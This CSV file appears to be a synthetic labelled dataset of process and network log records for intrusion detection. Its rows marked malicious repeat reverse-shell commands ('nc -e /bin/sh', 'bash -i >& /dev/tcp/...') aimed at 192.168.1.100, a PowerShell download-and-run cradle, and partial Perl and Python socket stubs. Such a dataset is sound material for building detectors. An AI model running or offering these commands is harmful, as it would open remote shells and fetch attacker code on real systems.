timestamp,process_id,parent_process,child_process,source_ip,destination_ip,destination_port,protocol,bytes_sent,bytes_received,duration,command_executed,is_malicious
2025-04-11 20:58:45.420337,0cd746b3,init,cmd.exe,80.62.218.158,35.141.161.93,4444,TCP,4257,3434,20.74,ls,0
2025-03-21 12:54:45.909865,1be8b240,systemd,notepad.exe,95.163.84.189,183.186.98.133,1337,TCP,2358,2597,4.18,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-28 05:20:45.991829,19a1d3a6,systemd,bash,139.234.87.144,155.211.83.72,8080,TCP,4166,1514,37.01,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-16 21:03:46.058049,c904a9c0,svchost.exe,chrome.exe,55.223.193.138,58.203.62.162,1337,UDP,1589,4347,36.81,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-02-26 11:05:45.687255,ea48b622,systemd,chrome.exe,91.91.17.63,64.49.64.252,3389,UDP,873,4150,11.07,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-25 12:59:45.659504,be2d5f68,systemd,cmd.exe,118.84.19.148,155.163.96.167,4444,TCP,2729,4853,40.46,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-29 20:51:45.805221,8b450084,explorer.exe,notepad.exe,81.158.124.245,54.222.100.231,443,UDP,4656,1127,3.75,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-16 10:38:45.783527,131f7d80,explorer.exe,chrome.exe,248.233.214.113,172.179.161.196,3389,UDP,3991,3593,6.99,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-09 07:37:45.233202,f044afaf,systemd,svchost.exe,93.39.9.1,4.151.234.30,1337,UDP,2886,3521,42.67,ping,0
2025-02-21 18:49:45.575915,b291be20,explorer.exe,python.exe,160.101.20.232,116.198.253.89,1337,UDP,2559,424,9.48,dir,0
2025-04-06 04:00:45.659404,3b5f4172,init,notepad.exe,206.217.94.125,53.176.199.147,4444,TCP,3370,603,33.66,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-08 07:32:45.646824,b65291eb,explorer.exe,bash,21.249.157.24,230.35.3.89,443,TCP,2953,2567,34.5,dir,0
2025-03-25 05:16:45.660908,7e3da48d,svchost.exe,cmd.exe,168.41.92.109,3.118.75.63,443,UDP,3595,318,18.09,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-25 16:22:45.610794,833b485f,init,powershell,164.158.44.217,41.10.195.186,443,UDP,2472,2793,42.95,cd,0
2025-03-17 09:03:46.259034,25e67326,systemd,powershell,207.12.16.38,134.100.182.97,4444,TCP,305,3152,54.71,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-01 02:18:45.288371,cde98707,explorer.exe,powershell,135.49.166.173,93.152.18.175,4444,UDP,2053,417,31.61,ping,0
2025-02-28 10:08:45.550363,1fa2ca97,systemd,nc,110.171.37.64,25.88.254.198,4444,UDP,3007,4374,34.9,ping,0
2025-02-26 06:09:46.328762,076a3d1e,svchost.exe,svchost.exe,153.241.37.186,122.82.63.225,8080,UDP,2060,3589,1.26,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-22 11:35:45.424824,6a584c81,init,explorer.exe,6.220.193.29,205.76.17.242,3389,TCP,2878,1855,28.07,dir,0
2025-02-26 22:20:46.280297,b7229f11,explorer.exe,bash,142.207.206.211,131.194.1.54,1337,TCP,2778,1871,49.65,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-11 03:15:45.647210,09d29010,init,cmd.exe,146.12.41.224,40.160.171.189,3389,UDP,2765,4365,56.39,dir,0
2025-04-29 03:03:45.050288,2ef2c7ac,svchost.exe,python.exe,15.118.178.199,148.117.87.200,443,TCP,656,3783,30.43,cd,0
2025-04-20 22:15:46.082420,80b6d9eb,init,explorer.exe,22.210.56.40,161.75.108.78,1337,UDP,746,319,49.45,nc -e /bin/sh 192.168.1.100 4444,1
2025-02-23 13:54:46.282404,f04ae03e,systemd,powershell,133.72.11.128,3.181.132.107,22,UDP,946,3673,23.97,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-13 12:03:46.297948,1e58dd23,systemd,perl,93.239.167.182,149.79.119.153,3389,TCP,866,788,56.29,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-29 05:24:45.815809,8cc3d7ed,explorer.exe,cmd.exe,48.170.12.96,149.173.230.201,8080,TCP,2686,1106,36.8,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-28 23:32:45.900090,97853b38,svchost.exe,nc,240.108.156.171,179.86.77.48,443,UDP,943,2051,5.03,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-17 05:18:44.910996,dd3fca23,explorer.exe,perl,225.91.50.184,215.252.232.245,3389,UDP,2862,2992,36.01,ipconfig,0
2025-04-25 21:57:45.618332,e0cc7b0e,svchost.exe,svchost.exe,119.73.207.189,147.210.243.167,4444,TCP,2357,3744,45.61,ipconfig,0
2025-04-13 21:44:45.501167,44a916f8,svchost.exe,nc,111.125.10.151,190.108.188.144,8080,TCP,4807,4532,29.17,cd,0
2025-04-20 10:22:45.592856,4fc86043,svchost.exe,powershell,103.65.34.211,99.220.7.232,22,TCP,3003,4391,30.04,cd,0
2025-03-11 03:42:45.090870,a05e1a37,explorer.exe,nc,130.170.152.236,117.159.40.99,1337,TCP,732,3369,39.16,dir,0
2025-02-23 07:34:45.493674,bdca9272,svchost.exe,powershell,153.225.133.244,245.137.132.171,3389,TCP,4735,103,19.4,cd,0
2025-03-03 13:04:44.750314,efc3f0d0,systemd,chrome.exe,142.11.248.99,170.49.77.179,8080,TCP,2993,4035,5.18,cd,0
2025-04-19 16:04:44.856929,d71af363,init,notepad.exe,140.179.4.126,140.217.48.143,8080,TCP,3286,3459,4.75,ping,0
2025-04-17 13:03:44.971276,907a40ee,explorer.exe,bash,94.26.200.232,53.38.235.117,22,TCP,332,2501,37.13,ipconfig,0
2025-02-25 20:33:45.987176,7b0f45bb,svchost.exe,notepad.exe,139.76.54.38,66.109.25.12,8080,TCP,1790,2376,43.55,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-22 05:27:45.317472,6e4a6a93,explorer.exe,explorer.exe,227.6.200.159,27.137.34.81,8080,TCP,1379,4382,7.67,ping,0
2025-04-07 18:01:45.088530,38782601,systemd,explorer.exe,25.164.236.206,148.65.46.102,8080,TCP,3322,1629,53.77,ping,0
2025-03-24 16:59:44.762234,95bc5941,systemd,explorer.exe,234.58.7.59,110.99.38.91,1337,UDP,1900,3201,41.24,dir,0
2025-03-05 21:05:45.087559,5f493654,svchost.exe,perl,202.111.146.243,231.115.106.133,8080,TCP,466,3878,33.5,ipconfig,0
2025-04-30 13:11:46.088929,afc25ed9,init,perl,9.29.238.139,88.86.168.244,8080,TCP,176,4955,35.65,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-17 00:59:45.559785,301b88c5,systemd,cmd.exe,236.193.248.106,10.94.232.172,443,UDP,2087,3418,35.84,ipconfig,0
2025-04-29 16:30:45.787490,548ba553,svchost.exe,nc,202.220.15.127,218.65.152.13,443,UDP,4387,1068,44.28,"python -c 'import socket,subprocess'",1
2025-04-28 18:15:45.774062,90900003,init,nc,228.214.102.99,244.124.58.73,8080,UDP,3399,2104,13.96,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-04 16:48:45.383902,7625037c,explorer.exe,cmd.exe,46.151.204.147,117.150.82.139,1337,TCP,2810,1719,0.27,dir,0
2025-02-27 21:08:45.496389,11f3dec8,systemd,cmd.exe,207.156.102.223,150.191.87.152,8080,UDP,3674,857,5.05,dir,0
2025-04-18 03:40:45.483008,5c944255,init,svchost.exe,126.183.77.13,92.180.86.146,4444,TCP,142,3457,55.79,ping,0
2025-04-26 16:50:46.281351,258afb0a,systemd,cmd.exe,59.99.47.198,108.169.179.113,3389,TCP,4843,2374,17.59,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-12 19:19:45.088760,f6d24386,systemd,notepad.exe,181.179.30.24,145.131.147.111,3389,TCP,3019,2526,2.12,ls,0
2025-03-15 22:05:46.355968,6122f2f1,explorer.exe,notepad.exe,150.178.13.243,109.65.141.201,443,TCP,223,1876,1.28,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-03-22 19:18:45.895739,fde15b7c,systemd,python.exe,88.64.30.70,115.53.93.231,22,UDP,4562,1742,47.58,"python -c 'import socket,subprocess'",1
2025-02-27 00:36:45.183039,8c794b27,init,python.exe,119.212.65.31,199.115.159.211,443,TCP,746,2885,17.25,ping,0
2025-03-09 20:32:45.275969,d2ad49e7,explorer.exe,explorer.exe,20.236.138.86,199.204.64.187,3389,UDP,1717,3998,54.03,ls,0
2025-04-29 21:09:45.666859,69e8a8a7,svchost.exe,bash,11.153.224.129,139.67.134.55,443,TCP,194,3599,36.96,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-31 18:33:45.460491,90d2b336,svchost.exe,python.exe,253.228.214.229,252.51.59.182,1337,TCP,1008,920,22.24,ping,0
2025-03-27 14:27:45.391421,0d882d44,svchost.exe,cmd.exe,180.141.98.213,92.213.88.159,3389,UDP,2164,431,18.25,ipconfig,0
2025-04-03 01:08:45.727387,9c664323,init,svchost.exe,149.72.35.179,42.39.174.9,4444,UDP,1373,3590,21.71,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-14 04:21:44.961555,d0557af5,explorer.exe,powershell,236.214.227.19,132.28.137.100,3389,UDP,5000,1194,13.66,ping,0
2025-04-23 00:25:45.007138,21e77307,explorer.exe,perl,91.241.139.137,19.42.51.109,1337,UDP,3197,321,30.54,ipconfig,0
2025-03-26 14:14:45.451175,71dd3b49,init,notepad.exe,241.5.142.54,183.231.154.244,4444,UDP,4222,4843,49.78,cd,0
2025-04-19 01:59:45.387516,68546738,systemd,svchost.exe,14.59.235.30,238.126.168.210,443,TCP,1622,2079,8.36,ls,0
2025-03-26 01:12:45.741364,83d7e18b,explorer.exe,python.exe,73.202.62.52,83.86.160.253,1337,TCP,4552,4579,49.99,"python -c 'import socket,subprocess'",1
2025-03-09 09:44:45.928715,7e77e4d7,init,chrome.exe,7.36.61.78,164.144.209.229,443,UDP,2663,2793,25.86,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-04-02 08:37:45.221284,c734632d,svchost.exe,svchost.exe,25.245.212.99,219.49.121.167,22,TCP,4755,2900,15.14,ipconfig,0
2025-03-17 22:16:45.209605,10539746,explorer.exe,svchost.exe,63.94.178.166,40.115.2.214,22,UDP,4216,117,51.42,ls,0
2025-04-05 16:34:45.963402,3fd31897,svchost.exe,perl,90.156.55.3,9.199.205.7,1337,TCP,3668,223,25.01,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-03-02 09:21:45.756069,ff8d77e7,svchost.exe,notepad.exe,85.111.74.18,233.86.70.142,22,UDP,1817,887,1.33,"python -c 'import socket,subprocess'",1
2025-03-25 11:36:46.295815,6d27d852,svchost.exe,perl,207.155.64.60,241.135.121.186,8080,TCP,156,1999,18.27,"python -c 'import socket,subprocess'",1
2025-03-11 20:07:44.776277,7d9c491b,explorer.exe,explorer.exe,36.198.198.18,223.202.180.183,1337,UDP,3009,3702,44.86,ls,0
2025-04-15 12:09:45.016995,03abdfd3,systemd,explorer.exe,125.36.22.212,219.82.204.147,1337,TCP,2753,3197,0.43,ls,0
2025-04-07 03:09:45.158232,f9ec0b92,init,svchost.exe,226.211.140.4,169.126.157.72,3389,TCP,166,3434,21.09,ping,0
2025-04-01 05:11:46.068638,912715e5,init,explorer.exe,63.24.115.183,251.149.22.84,1337,UDP,1168,3490,6.44,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-27 20:03:45.963616,288ac85a,init,explorer.exe,52.53.131.40,150.52.31.173,22,UDP,2386,3984,11.35,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-13 23:19:45.176514,dc5af284,explorer.exe,svchost.exe,229.184.144.219,11.186.123.30,1337,UDP,4652,463,33.88,ipconfig,0
2025-03-22 13:40:46.293321,8b7314e0,init,chrome.exe,17.121.88.159,252.245.5.26,1337,UDP,2610,1587,31.17,"python -c 'import socket,subprocess'",1
2025-04-28 09:47:44.981764,c8d0a5d7,explorer.exe,nc,140.175.243.31,143.41.38.42,443,UDP,2270,4743,47.92,ping,0
2025-04-14 15:39:45.402815,472921bd,explorer.exe,nc,154.68.149.161,86.136.231.5,1337,TCP,4992,2546,46.72,cd,0
2025-04-26 17:50:45.079031,1b659f4a,init,chrome.exe,99.139.69.193,157.10.234.238,3389,UDP,3461,2446,11.98,dir,0
2025-04-04 03:42:45.329495,03d8365e,explorer.exe,explorer.exe,45.49.112.28,216.70.123.121,443,UDP,2425,2724,27.69,ping,0
2025-03-07 22:45:44.953605,58f23f57,explorer.exe,nc,196.38.207.102,170.180.134.83,22,TCP,3859,1195,33.21,ping,0
2025-03-04 07:18:46.131747,4b18c54e,explorer.exe,cmd.exe,217.237.212.81,121.218.148.18,8080,TCP,2966,3131,44.32,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-22 05:43:45.172773,15b5c98b,init,nc,122.167.67.75,157.72.10.32,443,UDP,746,3411,50.36,cd,0
2025-04-14 04:11:44.980956,e7b9a8c7,systemd,cmd.exe,4.219.167.20,121.148.183.19,3389,UDP,2230,2850,37.81,cd,0
2025-02-22 03:55:45.023309,34717827,explorer.exe,python.exe,128.156.73.36,128.221.95.59,8080,TCP,3775,1750,10.05,cd,0
2025-03-13 01:12:45.807108,085fb7d7,explorer.exe,nc,28.158.173.242,180.217.124.134,3389,TCP,1433,2440,20.88,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-26 15:21:46.038152,4626f7e8,svchost.exe,perl,197.244.1.179,28.215.201.29,4444,TCP,341,751,21.84,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-29 17:08:44.935184,ba8c6c51,init,nc,51.27.199.238,68.27.39.121,443,UDP,4864,1486,6.6,ls,0
2025-02-24 08:29:46.061576,0c176018,systemd,explorer.exe,244.134.201.220,123.173.188.79,4444,UDP,160,3456,6.07,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-15 08:49:44.792837,2b43dbc1,svchost.exe,bash,158.136.243.32,179.152.135.122,3389,TCP,1128,3965,0.5,ping,0
2025-03-10 13:37:44.859574,f6c58d13,systemd,cmd.exe,130.70.153.40,173.178.178.112,8080,UDP,4480,3656,51.93,ls,0
2025-03-17 00:14:45.240270,c47b9423,svchost.exe,python.exe,168.194.212.182,212.94.112.39,443,TCP,3698,629,17.83,cd,0
2025-03-04 00:11:45.032703,89261401,init,perl,207.210.117.145,160.240.222.21,22,TCP,1787,265,28.54,cd,0
2025-03-27 22:25:44.731468,d09f074d,systemd,nc,141.168.242.176,87.66.196.211,8080,UDP,3825,1428,43.99,ping,0
2025-02-24 06:48:45.747790,87177899,svchost.exe,notepad.exe,34.122.90.23,168.113.222.220,443,TCP,1119,781,17.3,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-01 08:00:44.779915,553e7a2a,init,python.exe,239.231.92.52,191.39.246.55,4444,TCP,3023,2634,35.05,cd,0
2025-02-25 22:57:44.953468,0a27cf9a,systemd,notepad.exe,39.72.252.143,178.121.128.49,8080,UDP,940,4376,32.24,ipconfig,0
2025-02-27 13:51:45.309626,e321a21a,init,powershell,53.139.122.130,80.51.40.35,443,UDP,2267,1144,8.9,dir,0
2025-04-18 15:04:45.716030,2dcd012d,init,perl,45.200.40.69,9.231.166.87,1337,TCP,4064,2927,18.13,powershell IEX (New-Object Net.WebClient).DownloadString,1
2025-04-09 01:49:45.802235,473657c1,init,svchost.exe,17.100.224.99,20.1.253.79,3389,UDP,188,3735,59.42,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-19 07:22:45.747172,29b09706,init,cmd.exe,182.208.71.41,153.162.144.181,22,TCP,2066,1378,45.68,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-02-24 05:48:45.193633,9daef7cb,explorer.exe,notepad.exe,145.227.23.182,135.201.188.84,8080,UDP,3921,2501,39.12,ping,0
2025-03-07 23:20:45.222782,7e733c5e,init,chrome.exe,153.199.103.233,95.173.24.78,8080,TCP,1034,1899,36.08,cd,0
2025-04-23 15:18:44.960774,100e69b6,svchost.exe,perl,55.251.176.247,105.208.46.70,22,UDP,989,3554,14.04,ls,0
2025-04-07 02:26:46.309949,1d879ed1,svchost.exe,svchost.exe,44.254.151.6,199.98.1.22,4444,TCP,1699,2818,52.58,nc -e /bin/sh 192.168.1.100 4444,1
2025-04-22 01:05:46.219931,84a3f026,explorer.exe,powershell,98.180.10.160,254.159.97.29,3389,TCP,3229,4100,2.38,nc -e /bin/sh 192.168.1.100 4444,1
2025-03-03 11:02:44.954582,d3de3e3f,explorer.exe,cmd.exe,161.101.224.28,93.3.220.25,443,TCP,2790,481,25.08,ping,0
2025-02-27 00:15:45.388298,a3f80908,svchost.exe,nc,15.207.69.5,18.1.109.133,443,UDP,2874,525,12.88,ping,0
2025-04-20 14:06:44.787546,2bef0cc7,systemd,chrome.exe,183.11.60.64,191.12.188.19,1337,UDP,1139,1836,16.67,dir,0
2025-03-12 20:19:46.149429,4547d9c8,svchost.exe,powershell,208.150.124.30,152.46.34.190,22,UDP,2204,1001,12.9,"python -c 'import socket,subprocess'",1
2025-04-24 11:01:44.881877,d824432e,svchost.exe,nc,104.43.202.249,40.122.64.86,443,TCP,2603,74,56.35,ls,0
2025-03-17 08:23:45.913312,7e77b630,systemd,explorer.exe,55.27.56.131,76.3.231.188,3389,UDP,4145,4604,17.38,bash -i >& /dev/tcp/192.168.1.100/8080 0>&1,1
2025-02-25 14:57:45.280134,2ae923bf,systemd,notepad.exe,95.93.172.173,24.145.115.111,3389,UDP,1965,3069,41.46,dir,0
2025-03-06 22:47:45.589323,08639bcc,svchost.exe,nc,62.95.94.18,102.18.185.134,443,UDP,149,963,50.32,cd,0
2025-03-02 23:31:44.758021,212549c1,explorer.exe,explorer.exe,100.55.118.57,17.169.209.72,1337,UDP,409,601,53.14,cd,0
2025-04-08 06:39:46.368970,7a080543,systemd,perl,85.144.95.65,226.160.248.73,22,TCP,1305,4804,42.81,"perl -e 'use Socket;$i=""192.168.1.100"";$p=1234;'",1
2025-04-17 13:54:45.525432,5b56a913,systemd,python.exe,167.19.173.81,120.129.122.56,443,TCP,2309,4169,28.95,cd,0
2025-03-25 21:54:45.176952,a9064b76,svchost.exe,nc,83.20.102.101,184.218.244.105,443,TCP,2041,674,29.78,ls,0
2025-03-05 05:52:45.156652,8df9245a,explorer.exe,notepad.exe,148.181.26.241,212.53.225.223,443,TCP,3075,2791,25.47,dir,0
2025-04-13 16:54:44.839844,120d72d3,explorer.exe,bash,198.82.137.209,21.90.54.244,3389,UDP,1424,1024,29.39,ipconfig,0
2025-03-01 00:07:44.829691,65d08f00,svchost.exe,explorer.exe,243.203.131.43,241.251.177.139,3389,UDP,4135,752,41.87,cd,0
